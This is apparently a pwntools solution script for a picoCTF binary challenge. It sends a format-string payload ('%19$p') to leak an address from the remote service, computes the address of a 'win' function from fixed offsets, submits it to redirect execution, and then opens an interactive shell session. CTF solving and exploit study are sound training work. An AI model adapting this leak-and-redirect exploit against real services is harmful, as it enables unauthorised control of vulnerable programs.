#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln", checksec=False)
context.binary = exe

if args.LOCAL:
    p = process([exe.path])
    if args.DEBUG:
        gdb.attach(p)
else:
    p = remote("rescued-float.picoctf.net", 59562)

# input()

# Leak main address
p.sendlineafter(b'name:', b'%19$p')
main_leak = int(p.recvline()[:-1], 16)
print("Main leak: " + hex(main_leak))
main_addr = main_leak - 0x41
print("Main address: " + hex(main_addr))

win_addr = main_addr - 0x96
p.sendlineafter(b'0x12345: ', hex(win_addr).encode())

p.interactive()